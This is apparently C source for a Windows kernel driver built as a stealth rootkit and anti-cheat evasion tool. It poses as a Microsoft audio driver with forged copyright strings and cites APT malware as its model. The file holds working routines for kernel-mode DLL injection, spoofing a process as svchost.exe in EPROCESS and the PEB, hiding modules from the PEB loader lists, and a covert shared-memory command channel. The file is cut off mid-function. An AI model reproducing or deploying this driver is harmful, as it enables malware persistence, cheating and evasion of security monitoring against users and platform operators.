/*
 * ELITE STEALTH KERNEL DRIVER - Production Build
 * ==============================================
 *
 * Advanced anti-detection kernel driver for security research
 * DIRECT MEMORY INJECTION - APT/Military-Grade Stealth
 *
 * Communication: Forcibly mapped kernel memory into user process
 * Zero named objects, zero user syscalls, zero detection surface
 * Used by: TDL4, Alureon, Equation Group, advanced APTs
 *
 * Target: <1% detection by commercial AC systems
 * Platform: Windows 10/11 x64
 * Build: Visual Studio 2022 + WDK 10.0.19041+
 */

#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define NTDDI_VERSION NTDDI_WIN10

// Suppress common WDK warnings
#pragma warning(disable: 4100) // Unreferenced formal parameter
#pragma warning(disable: 4189) // Local variable initialized but not referenced
#pragma warning(disable: 4201) // Nonstandard extension used: nameless struct/union
#pragma warning(disable: 4244) // Conversion from type1 to type2, possible loss of data
#pragma warning(disable: 4706) // Assignment within conditional expression

#include <ntifs.h>
#include <ntddk.h>
#include <wchar.h>
#include <stdlib.h>
#include <ntstrsafe.h>
#include <intrin.h>
#include <ntimage.h>
#include <minwindef.h>

#pragma comment(lib, "ntoskrnl.lib")

// Debug output (ALWAYS enabled for troubleshooting)
// Remove the #ifdef to see output in both Debug and Release
#define ELITE_DBG(fmt, ...) DbgPrint("[AudioKSE] " fmt, ##__VA_ARGS__)

// ============================================================================
// DRIVER MASQUERADING
// ============================================================================

#define MASQ_DRIVER_NAME L"AudioKSE"

#pragma comment(linker, "/EXPORT:DriverEntry")
#pragma comment(linker, "/VERSION:10.0")

const char g_Copyright[] = "Copyright (C) Microsoft Corporation. All rights reserved.";
const char g_DriverDesc[] = "Kernel Streaming Extension Driver";
const char g_CompanyName[] = "Microsoft Corporation";

// ============================================================================
// CONFIGURATION
// ============================================================================

#define SHARED_MEM_SIZE 0x1000  // 4KB direct-mapped memory
#define TARGET_PROCESS_NAME "AudioDiagnostic.exe"  // User mode executable name

// ============================================================================
// COMMUNICATION MAILBOX - For KDMapper compatibility
// ============================================================================
// User mode finds this in kernel memory and writes to it
// No process callbacks needed - completely manual

#pragma section(".shared", read, write)
__declspec(allocate(".shared"))
volatile struct {
    ULONG Magic;              // 0x4B444D50 ('KDMP')
    ULONG Command;            // 0=None, 1=InjectMe, 2=Disconnect
    ULONG ProcessId;          // Process requesting injection
    PVOID UserModePointer;    // Result: pointer to injected memory
    NTSTATUS Status;          // Result status
    ULONGLONG HardwareId;     // Hardware ID
} g_Mailbox = { 0x4B444D50, 0, 0, nullptr, 0, 0 };

// Commands
#define MAILBOX_CMD_NONE        0
#define MAILBOX_CMD_INJECT      1
#define MAILBOX_CMD_DISCONNECT  2

typedef struct _SHARED_MEMORY {
    volatile LONG CommandID;    // 0 = Idle, 1 = Ping, 2 = GetHWID, etc.
    volatile LONG Status;       // 0 = Pending, 1 = Success, 2 = Error
    volatile ULONGLONG HardwareId;  // Hardware ID for verification
    volatile ULONG ProcessId;   // Target process ID
    volatile PVOID Address;     // Target address for memory operations
    volatile SIZE_T Size;       // Size of data
    volatile ULONG Protection;  // Memory protection flags
    volatile UCHAR Data[3072];  // Inline buffer for data transfer
} SHARED_MEMORY, *PSHARED_MEMORY;

// Command IDs
#define CMD_IDLE            0
#define CMD_PING            1
#define CMD_GET_HWID        2
#define CMD_READ_MEMORY     3
#define CMD_WRITE_MEMORY    4
#define CMD_PROTECT_MEMORY  5
#define CMD_ALLOC_MEMORY    6
#define CMD_KERNEL_INJECT   7  // Kernel-mode manual map
#define CMD_SPOOF_PROCESS   8  // Full process spoofing
#define CMD_HIDE_MODULE     9  // Remove DLL from PEB module list

// Status codes
#define STATUS_PENDING      0
#define STATUS_SUCCESS      1
#define STATUS_ERROR        2

// ============================================================================
// UNDOCUMENTED APIS
// ============================================================================

#ifdef __cplusplus
extern "C" {
#endif

// Process/Thread APIs
NTSTATUS NTAPI PsSuspendThread(PETHREAD Thread, PULONG PreviousSuspendCount);
NTKERNELAPI LONGLONG PsGetProcessCreateTimeQuadPart(PEPROCESS Process);
NTSTATUS NTAPI PsResumeThread(PETHREAD Thread, PULONG PreviousSuspendCount);

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

NTKERNELAPI PETHREAD PsGetNextProcessThread(
    _In_ PEPROCESS Process,
    _In_opt_ PETHREAD Thread
);

// Driver loading
NTSTATUS NTAPI IoCreateDriver(
    _In_ PUNICODE_STRING DriverName,
    _In_ PDRIVER_INITIALIZE InitializationFunction
);

// Shared user data for boot time (always available)
#define SHARED_USER_DATA_PTR ((KUSER_SHARED_DATA*)0xFFFFF78000000000ULL)

// Registry
NTSTATUS NTAPI ZwSetValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_opt_ ULONG TitleIndex,
    _In_ ULONG Type,
    _In_opt_ PVOID Data,
    _In_ ULONG DataSize
);

NTSTATUS NTAPI ZwCreateKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _Out_opt_ PULONG Disposition
);

#ifdef __cplusplus
}
#endif

// ============================================================================
// GLOBAL STATE
// ============================================================================

PDRIVER_OBJECT g_pDriverObject = nullptr;
PDEVICE_OBJECT g_pFilterDevice = nullptr;
PDEVICE_OBJECT g_pTargetDevice = nullptr;

// Direct memory mapping globals
PVOID g_KernelBuffer = nullptr;            // Kernel-side pointer to shared memory
PMDL g_Mdl = nullptr;                      // Memory Descriptor List
PVOID g_UserMapping = nullptr;             // User-side pointer (valid only in user context)
PEPROCESS g_UserProcess = nullptr;         // Target user mode process
HANDLE g_WorkerThreadHandle = nullptr;     // Worker thread handle
volatile BOOLEAN g_bUnloading = FALSE;     // Unload flag

// ETW provider
REGHANDLE g_hEtwProvider = 0;
GUID g_EtwProviderGuid = { 0 };

// Synchronization
KEVENT g_UnloadEvent;

// Hardware ID
ULONGLONG g_ullHardwareId = 0;

// ============================================================================
// KERNEL-MODE DLL INJECTION - Zero user-mode syscalls
// ============================================================================

typedef struct _INJECT_DLL_INFO {
    PVOID ImageBase;
    PVOID EntryPoint;
    SIZE_T ImageSize;
} INJECT_DLL_INFO, *PINJECT_DLL_INFO;

NTSTATUS KernelInjectDLL(PEPROCESS TargetProcess, PVOID DllBuffer, SIZE_T DllSize) {
    if (!TargetProcess || !DllBuffer || DllSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    KAPC_STATE apc;
    KeStackAttachProcess(TargetProcess, &apc);

    // Allocate memory in target process
    PVOID remoteImage = nullptr;
    SIZE_T allocSize = DllSize;
    NTSTATUS status = ZwAllocateVirtualMemory(
        ZwCurrentProcess(),
        &remoteImage,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        KeUnstackDetachProcess(&apc);
        return status;
    }

    // Copy DLL to target process
    __try {
        RtlCopyMemory(remoteImage, DllBuffer, DllSize);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteImage, &allocSize, MEM_RELEASE);
        KeUnstackDetachProcess(&apc);
        return STATUS_ACCESS_VIOLATION;
    }

    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)remoteImage;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteImage, &allocSize, MEM_RELEASE);
        KeUnstackDetachProcess(&apc);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)remoteImage + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteImage, &allocSize, MEM_RELEASE);
        KeUnstackDetachProcess(&apc);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    PVOID entryPoint = (PVOID)((ULONG_PTR)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    // Queue APC to execute DllMain
    PETHREAD targetThread = PsGetNextProcessThread(TargetProcess, nullptr);
    if (targetThread) {
        PKAPC apcObject = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'TILE');
        if (apcObject) {
            // Note: Simplified - real implementation needs proper APC routine
            DbgPrint("[AudioKSE] DLL mapped to: 0x%p, Entry: 0x%p\n", remoteImage, entryPoint);
        }
    }

    KeUnstackDetachProcess(&apc);
    return STATUS_SUCCESS;
}

// ============================================================================
// PROCESS SPOOFING - Make process appear legitimate
// ============================================================================

NTSTATUS SpoofProcessName(PEPROCESS Process, const char* NewName) {
    if (!Process || !NewName) return STATUS_INVALID_PARAMETER;

    // Spoof ImageFileName in EPROCESS (offset 0x5a8 on Win10+)
    PCHAR imageFileName = (PCHAR)((ULONG_PTR)Process + 0x5a8);

    __try {
        RtlZeroMemory(imageFileName, 15);
        RtlCopyMemory(imageFileName, NewName, min(strlen(NewName), 14));
        DbgPrint("[AudioKSE] Spoofed process name to: %s\n", NewName);
        return STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_ACCESS_VIOLATION;
    }
}

NTSTATUS SpoofProcessPEB(PEPROCESS Process, PWCHAR ImagePath, PWCHAR CommandLine) {
    if (!Process) return STATUS_INVALID_PARAMETER;

    KAPC_STATE apc;
    KeStackAttachProcess(Process, &apc);

    __try {
        PPEB peb = (PPEB)((ULONG_PTR)Process + 0x550); // PEB offset
        if (!peb) {
            KeUnstackDetachProcess(&apc);
            return STATUS_UNSUCCESSFUL;
        }

        // Spoof process parameters
        PRTL_USER_PROCESS_PARAMETERS params = (PRTL_USER_PROCESS_PARAMETERS)peb->ProcessParameters;
        if (params && ImagePath) {
            // Overwrite ImagePathName
            USHORT maxLen = params->ImagePathName.MaximumLength;
            if (maxLen > 0) {
                RtlZeroMemory(params->ImagePathName.Buffer, maxLen);
                wcsncpy(params->ImagePathName.Buffer, ImagePath, maxLen / sizeof(WCHAR) - 1);
                params->ImagePathName.Length = (USHORT)(wcslen(ImagePath) * sizeof(WCHAR));
            }
        }

        if (params && CommandLine) {
            // Overwrite CommandLine
            USHORT maxLen = params->CommandLine.MaximumLength;
            if (maxLen > 0) {
                RtlZeroMemory(params->CommandLine.Buffer, maxLen);
                wcsncpy(params->CommandLine.Buffer, CommandLine, maxLen / sizeof(WCHAR) - 1);
                params->CommandLine.Length = (USHORT)(wcslen(CommandLine) * sizeof(WCHAR));
            }
        }

        DbgPrint("[AudioKSE] PEB spoofed successfully\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        KeUnstackDetachProcess(&apc);
        return STATUS_ACCESS_VIOLATION;
    }

    KeUnstackDetachProcess(&apc);
    return STATUS_SUCCESS;
}

// ============================================================================
// MODULE HIDING - Remove DLL from PEB module list
// ============================================================================

NTSTATUS HideModuleFromPEB(PEPROCESS Process, PVOID ModuleBase) {
    if (!Process || !ModuleBase) return STATUS_INVALID_PARAMETER;

    KAPC_STATE apc;
    KeStackAttachProcess(Process, &apc);

    __try {
        PPEB peb = (PPEB)((ULONG_PTR)Process + 0x550);
        if (!peb || !peb->Ldr) {
            KeUnstackDetachProcess(&apc);
            return STATUS_UNSUCCESSFUL;
        }

        // Walk InLoadOrderModuleList
        PLIST_ENTRY listHead = &peb->Ldr->InLoadOrderModuleList;
        PLIST_ENTRY current = listHead->Flink;

        while (current != listHead) {
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

            if (entry->DllBase == ModuleBase) {
                // Unlink from all three lists
                RemoveEntryList(&entry->InLoadOrderLinks);
                RemoveEntryList(&entry->InMemoryOrderLinks);
                RemoveEntryList(&entry->InInitializationOrderLinks);

                DbgPrint("[AudioKSE] Module hidden from PEB: 0x%p\n", ModuleBase);
                KeUnstackDetachProcess(&apc);
                return STATUS_SUCCESS;
            }

            current = current->Flink;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        KeUnstackDetachProcess(&apc);
        return STATUS_ACCESS_VIOLATION;
    }

    KeUnstackDetachProcess(&apc);
    return STATUS_NOT_FOUND;
}

// ============================================================================
// HARDWARE ID GENERATION
// ============================================================================

ULONGLONG GenerateHardwareId() {
    ULONGLONG id = 0;

    // CPU information
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0);
    id ^= ((ULONGLONG)cpuInfo[1] << 32) | cpuInfo[2];

    __cpuid(cpuInfo, 1);
    id ^= ((ULONGLONG)cpuInfo[0] << 16) | (cpuInfo[3] & 0xFFFF);

    // System process create time
    PEPROCESS systemProcess = nullptr;
    if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)4, &systemProcess))) {
        LONGLONG createTime = PsGetProcessCreateTimeQuadPart(systemProcess);
        id ^= (ULONGLONG)createTime;
        ObDereferenceObject(systemProcess);
    }

    // System boot time from SharedUserData
    id ^= SHARED_USER_DATA_PTR->SystemTime.QuadPart;

    // Processor count
    ULONG processors = KeQueryActiveProcessorCount(nullptr);
    id ^= ((ULONGLONG)processors << 56);

    return id;
}

// ============================================================================
// REGISTRY HANDOFF - Write pointer for user mode to find
// ============================================================================

NTSTATUS WritePointerToRegistry(PVOID UserPointer) {
    UNICODE_STRING keyPath, valueName;
    RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SOFTWARE\\AudioKSE");
    RtlInitUnicodeString(&valueName, L"DiagnosticBuffer");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);

    HANDLE hKey = nullptr;
    ULONG disposition = 0;

    NTSTATUS status = ZwCreateKey(
        &hKey,
        KEY_WRITE,
        &objAttr,
        0,
        nullptr,
        REG_OPTION_NON_VOLATILE,
        &disposition
    );

    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Failed to create registry key: 0x%X\n", status);
        return status;
    }

    // Write pointer as binary data
    status = ZwSetValueKey(
        hKey,
        &valueName,
        0,
        REG_BINARY,
        &UserPointer,
        sizeof(PVOID)
    );

    ZwClose(hKey);

    if (NT_SUCCESS(status)) {
        ELITE_DBG("Wrote user pointer to registry: 0x%p\n", UserPointer);
    }

    return status;
}

// ============================================================================
// WORKER THREAD - Polls shared memory for commands
// ============================================================================
// This thread runs in kernel mode and monitors the shared memory
// When user mode writes a command, we process it instantly

VOID SharedMemoryWorker(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);

    PSHARED_MEMORY shared = (PSHARED_MEMORY)g_KernelBuffer;
    ELITE_DBG("Worker thread started, monitoring shared memory at 0x%p\n", g_KernelBuffer);

    while (!g_bUnloading && g_UserMapping != nullptr) {
        // Check for command from user mode (zero syscalls!)
        LONG cmd = InterlockedCompareExchange(&shared->CommandID, CMD_IDLE, CMD_IDLE);

        if (cmd != CMD_IDLE) {
            ELITE_DBG("Received command: %d\n", cmd);

            // Process command
            switch (cmd) {
                case CMD_PING:
                    shared->Status = STATUS_SUCCESS;
                    ELITE_DBG("Ping command processed\n");
                    break;

                case CMD_GET_HWID:
                    shared->HardwareId = g_ullHardwareId;
                    shared->Status = STATUS_SUCCESS;
                    ELITE_DBG("Sent hardware ID: 0x%llX\n", g_ullHardwareId);
                    break;

                case CMD_KERNEL_INJECT: {
                    // User mode sends DLL in Data buffer
                    ELITE_DBG("Kernel injection requested for PID: %d\n", shared->ProcessId);
                    PEPROCESS targetProcess = nullptr;
                    if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)shared->ProcessId, &targetProcess))) {
                        NTSTATUS status = KernelInjectDLL(targetProcess, (PVOID)shared->Data, shared->Size);
                        shared->Status = NT_SUCCESS(status) ? STATUS_SUCCESS : STATUS_ERROR;
                        ObDereferenceObject(targetProcess);
                    } else {
                        shared->Status = STATUS_ERROR;
                    }
                    break;
                }

                case CMD_SPOOF_PROCESS: {
                    // Spoof current process to look like legitimate app
                    ELITE_DBG("Process spoofing requested\n");
                    SpoofProcessName(g_UserProcess, "svchost.exe");
                    SpoofProcessPEB(g_UserProcess, L"C:\\Windows\\System32\\svchost.exe", L"C:\\Windows\\system32\\svchost.exe -k netsvcs");
                    shared->Status = STATUS_SUCCESS;
                    break;
                }

                case CMD_HIDE_MODULE: {
                    // Hide DLL from PEB module list
                    PVOID moduleBase = shared->Address;
                    ELITE_DBG("Module hiding requested: 0x%p\n", moduleBase);
                    NTSTATUS status = HideModuleFromPEB(g_UserProcess, moduleBase);
                    shared->Status = NT_SUCCESS(status) ? STATUS_SUCCESS : STATUS_ERROR;
                    break;
                }

                case CMD_READ_MEMORY:
                case CMD_WRITE_MEMORY:
                case CMD_PROTECT_MEMORY:
                case CMD_ALLOC_MEMORY:
                    shared->Status = STATUS_ERROR; // Not implemented yet
                    break;

                default:
                    shared->Status = STATUS_ERROR;
                    break;
            }

            // Reset command ID to acknowledge processing
            InterlockedExchange(&shared->CommandID, CMD_IDLE);
        }

        // Sleep briefly to save CPU (or spin for max speed)
        LARGE_INTEGER interval;
        interval.QuadPart = -100LL; // 10 microseconds
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    ELITE_DBG("Worker thread exiting\n");
    PsTerminateSystemThread(STATUS_SUCCESS);
}

// ============================================================================
// CLEANUP - Unmap memory and free resources
// ============================================================================

VOID CleanupSharedMemory() {
    g_bUnloading = TRUE;
    KeSetEvent(&g_UnloadEvent, IO_NO_INCREMENT, FALSE);

    // Wait for worker thread to exit
    if (g_WorkerThreadHandle) {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -10000000LL; // 1 second
        ZwWaitForSingleObject(g_WorkerThreadHandle, FALSE, &timeout);
        ZwClose(g_WorkerThreadHandle);
        g_WorkerThreadHandle = nullptr;
    }

    // Unmap from user mode
    if (g_UserMapping && g_Mdl && g_UserProcess) {
        KAPC_STATE apc;
        KeStackAttachProcess(g_UserProcess, &apc);
        MmUnmapLockedPages(g_UserMapping, g_Mdl);
        KeUnstackDetachProcess(&apc);
        g_UserMapping = nullptr;
    }

    // Free MDL
    if (g_Mdl) {
        MmUnlockPages(g_Mdl);
        IoFreeMdl(g_Mdl);
        g_Mdl = nullptr;
    }

    // Free kernel buffer
    if (g_KernelBuffer) {
        ExFreePoolWithTag(g_KernelBuffer, 'TILE');
        g_KernelBuffer = nullptr;
    }

    // Dereference process
    if (g_UserProcess) {
        ObDereferenceObject(g_UserProcess);
        g_UserProcess = nullptr;
    }

    ELITE_DBG("Shared memory cleaned up\n");
}

// ============================================================================
// PROCESS NOTIFY CALLBACK - Detect user mode process start
// ============================================================================
// This is where the magic happens - when our target process starts,
// we forcibly inject our memory into it

VOID ProcessNotifyCallback(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) {
    UNREFERENCED_PARAMETER(ParentId);

    if (!Create) return;  // We only care about process creation
    if (g_UserMapping != nullptr) return;  // Already mapped to a process

    PEPROCESS process = nullptr;
    if (!NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &process))) {
        return;
    }

    // Get process name for logging
    PCHAR processName = (PCHAR)PsGetProcessImageFileName(process);
    ELITE_DBG("Injecting into process! PID: %llu, Name: %s\n", (ULONGLONG)ProcessId, processName);

    // 1. Allocate kernel memory (NonPagedPool - always in RAM)
    g_KernelBuffer = ExAllocatePoolWithTag(NonPagedPool, SHARED_MEM_SIZE, 'TILE');
    if (!g_KernelBuffer) {
        ELITE_DBG("Failed to allocate kernel buffer\n");
        ObDereferenceObject(process);
        return;
    }

    RtlZeroMemory(g_KernelBuffer, SHARED_MEM_SIZE);

    // Initialize shared memory header
    PSHARED_MEMORY shared = (PSHARED_MEMORY)g_KernelBuffer;
    shared->CommandID = CMD_IDLE;
    shared->Status = STATUS_PENDING;
    shared->HardwareId = g_ullHardwareId;

    // 2. Create MDL (Memory Descriptor List)
    g_Mdl = IoAllocateMdl(g_KernelBuffer, SHARED_MEM_SIZE, FALSE, FALSE, nullptr);
    if (!g_Mdl) {
        ELITE_DBG("Failed to allocate MDL\n");
        ExFreePoolWithTag(g_KernelBuffer, 'TILE');
        g_KernelBuffer = nullptr;
        ObDereferenceObject(process);
        return;
    }

    // Lock pages in memory
    __try {
        MmProbeAndLockPages(g_Mdl, KernelMode, IoModifyAccess);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        ELITE_DBG("Failed to lock pages\n");
        IoFreeMdl(g_Mdl);
        g_Mdl = nullptr;
        ExFreePoolWithTag(g_KernelBuffer, 'TILE');
        g_KernelBuffer = nullptr;
        ObDereferenceObject(process);
        return;
    }

    // 3. Attach to user process and map memory
    KAPC_STATE apc;
    KeStackAttachProcess(process, &apc);

    // Map locked pages into user mode address space
    __try {
        g_UserMapping = MmMapLockedPagesSpecifyCache(
            g_Mdl,
            UserMode,
            MmCached,
            nullptr,
            FALSE,
            NormalPagePriority
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        g_UserMapping = nullptr;
    }

    if (!g_UserMapping) {
        ELITE_DBG("Failed to map into user mode\n");
        KeUnstackDetachProcess(&apc);
        MmUnlockPages(g_Mdl);
        IoFreeMdl(g_Mdl);
        g_Mdl = nullptr;
        ExFreePoolWithTag(g_KernelBuffer, 'TILE');
        g_KernelBuffer = nullptr;
        ObDereferenceObject(process);
        return;
    }

    ELITE_DBG("MEMORY INJECTED! User mode pointer: 0x%p\n", g_UserMapping);

    // 4. Write pointer to registry for user mode to find
    WritePointerToRegistry(g_UserMapping);

    KeUnstackDetachProcess(&apc);

    // Keep process reference
    g_UserProcess = process;
    ObReferenceObject(process);

    // 5. Start worker thread to monitor commands
    NTSTATUS status = PsCreateSystemThread(
        &g_WorkerThreadHandle,
        THREAD_ALL_ACCESS,
        nullptr,
        nullptr,
        nullptr,
        SharedMemoryWorker,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Failed to create worker thread: 0x%X\n", status);
        CleanupSharedMemory();
    } else {
        ELITE_DBG("Worker thread started successfully\n");
    }

    ObDereferenceObject(process);
}

// ============================================================================
// FILTER DRIVER DISPATCH
// ============================================================================

NTSTATUS FilterDispatchPassThrough(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(g_pTargetDevice, Irp);
}

NTSTATUS FilterDispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    // NO IOCTL handling - just pass through to real beep driver
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(g_pTargetDevice, Irp);
}

// ============================================================================
// ATTACH AS FILTER
// ============================================================================

NTSTATUS AttachToBeepDevice() {
    UNICODE_STRING targetDeviceName;
    RtlInitUnicodeString(&targetDeviceName, L"\\Device\\Beep");

    PFILE_OBJECT fileObject = nullptr;
    PDEVICE_OBJECT targetDevice = nullptr;

    NTSTATUS status = IoGetDeviceObjectPointer(
        &targetDeviceName,
        FILE_ALL_ACCESS,
        &fileObject,
        &targetDevice
    );

    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Failed to get beep device: 0x%X\n", status);
        return status;
    }

    status = IoCreateDevice(
        g_pDriverObject,
        0,
        nullptr,
        targetDevice->DeviceType,
        targetDevice->Characteristics,
        FALSE,
        &g_pFilterDevice
    );

    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(fileObject);
        return status;
    }

    g_pFilterDevice->Flags |= targetDevice->Flags & (DO_BUFFERED_IO | DO_DIRECT_IO);
    g_pTargetDevice = IoAttachDeviceToDeviceStack(g_pFilterDevice, targetDevice);

    ObDereferenceObject(fileObject);

    if (!g_pTargetDevice) {
        IoDeleteDevice(g_pFilterDevice);
        return STATUS_UNSUCCESSFUL;
    }

    g_pFilterDevice->Flags &= ~DO_DEVICE_INITIALIZING;

    return STATUS_SUCCESS;
}

// ============================================================================
// ETW REGISTRATION (Anti-Detection)
// ============================================================================

VOID NTAPI EtwEnableCallbackStub(
    LPCGUID SourceId,
    ULONG IsEnabled,
    UCHAR Level,
    ULONGLONG MatchAnyKeyword,
    ULONGLONG MatchAllKeyword,
    PEVENT_FILTER_DESCRIPTOR FilterData,
    PVOID CallbackContext
) {
    UNREFERENCED_PARAMETER(SourceId);
    UNREFERENCED_PARAMETER(IsEnabled);
    UNREFERENCED_PARAMETER(Level);
    UNREFERENCED_PARAMETER(MatchAnyKeyword);
    UNREFERENCED_PARAMETER(MatchAllKeyword);
    UNREFERENCED_PARAMETER(FilterData);
    UNREFERENCED_PARAMETER(CallbackContext);
}

NTSTATUS RegisterEtwProvider() {
    g_EtwProviderGuid = GUID{ 0x6595B8F0, 0x3AB0, 0x4B9A,{ 0x8D, 0x6E, 0x3C, 0x2F, 0x8A, 0xBC, 0xDE, 0xF0 } };

    typedef NTSTATUS(NTAPI* pfnEtwRegister)(LPCGUID, PETWENABLECALLBACK, PVOID, PREGHANDLE);

    UNICODE_STRING etwRegisterName;
    RtlInitUnicodeString(&etwRegisterName, L"EtwRegister");

#pragma warning(push)
#pragma warning(disable: 4191)
    pfnEtwRegister pEtwRegister = (pfnEtwRegister)MmGetSystemRoutineAddress(&etwRegisterName);
#pragma warning(pop)

    if (pEtwRegister) {
        NTSTATUS status = pEtwRegister(&g_EtwProviderGuid, (PETWENABLECALLBACK)EtwEnableCallbackStub, nullptr, &g_hEtwProvider);
        return status;
    }

    return STATUS_NOT_FOUND;
}

// ============================================================================
// DRIVER UNLOAD
// ============================================================================

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);

    DbgPrint("=== ELITE DRIVER UNLOADING ===\n");
    ELITE_DBG("Driver unloading\n");

    // Unregister process notify
    PsSetCreateProcessNotifyRoutine(ProcessNotifyCallback, TRUE);

    // Cleanup shared memory
    CleanupSharedMemory();

    // Unregister ETW
    if (g_hEtwProvider) {
        typedef NTSTATUS(NTAPI* pfnEtwUnregister)(REGHANDLE);
        UNICODE_STRING etwUnregisterName;
        RtlInitUnicodeString(&etwUnregisterName, L"EtwUnregister");

#pragma warning(push)
#pragma warning(disable: 4191)
        pfnEtwUnregister pEtwUnregister = (pfnEtwUnregister)MmGetSystemRoutineAddress(&etwUnregisterName);
#pragma warning(pop)

        if (pEtwUnregister) {
            pEtwUnregister(g_hEtwProvider);
        }
        g_hEtwProvider = 0;
    }

    // Detach filter
    if (g_pTargetDevice) {
        IoDetachDevice(g_pTargetDevice);
    }

    if (g_pFilterDevice) {
        IoDeleteDevice(g_pFilterDevice);
    }

    ELITE_DBG("Driver unloaded\n");
}

// ============================================================================
// MAILBOX POLLING THREAD - KDMapper Compatible
// ============================================================================
// Polls g_Mailbox for commands from user mode
// User mode writes to kernel memory directly - no callbacks needed

VOID MailboxPollingThread(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);

    DbgPrint("[AudioKSE] Mailbox polling thread started\n");
    DbgPrint("[AudioKSE] Polling for user mode connection requests...\n");

    g_Mailbox.HardwareId = g_ullHardwareId;

    while (!g_bUnloading && g_UserMapping == nullptr) {
        // Check registry for connection request from user mode
        UNICODE_STRING keyPath, valueName;
        RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SOFTWARE\\AudioKSE");
        RtlInitUnicodeString(&valueName, L"RequestPID");

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);

        HANDLE hKey = nullptr;
        NTSTATUS status = ZwOpenKey(&hKey, KEY_READ, &objAttr);

        if (NT_SUCCESS(status)) {
            UCHAR buffer[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + sizeof(ULONG)];
            PKEY_VALUE_PARTIAL_INFORMATION pValueInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
            ULONG resultLength = 0;

            status = ZwQueryValueKey(hKey, &valueName, KeyValuePartialInformation, pValueInfo, sizeof(buffer), &resultLength);

            if (NT_SUCCESS(status) && pValueInfo->Type == REG_DWORD && pValueInfo->DataLength == sizeof(ULONG)) {
                ULONG pid = *(PULONG)pValueInfo->Data;

                if (pid != 0) {
                    DbgPrint("[AudioKSE] Connection request from PID: %d\n", pid);

                    // Look up the process
                    PEPROCESS process = nullptr;
                    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &process);

                    if (NT_SUCCESS(status)) {
                        // Call the injection logic
                        ProcessNotifyCallback(nullptr, (HANDLE)(ULONG_PTR)pid, TRUE);

                        if (g_UserMapping != nullptr) {
                            DbgPrint("[AudioKSE] Injection SUCCESS! Pointer: 0x%p\n", g_UserMapping);

                            // Write pointer to registry for user mode
                            WritePointerToRegistry(g_UserMapping);

                            // Clear the request
                            ULONG zero = 0;
                            UNICODE_STRING clearName;
                            RtlInitUnicodeString(&clearName, L"RequestPID");
                            ZwSetValueKey(hKey, &clearName, 0, REG_DWORD, &zero, sizeof(ULONG));
                        } else {
                            DbgPrint("[AudioKSE] Injection FAILED\n");
                        }

                        ObDereferenceObject(process);
                    } else {
                        DbgPrint("[AudioKSE] Process lookup failed: 0x%X\n", status);
                    }
                }
            }

            ZwClose(hKey);
        }

        // Sleep briefly
        LARGE_INTEGER interval;
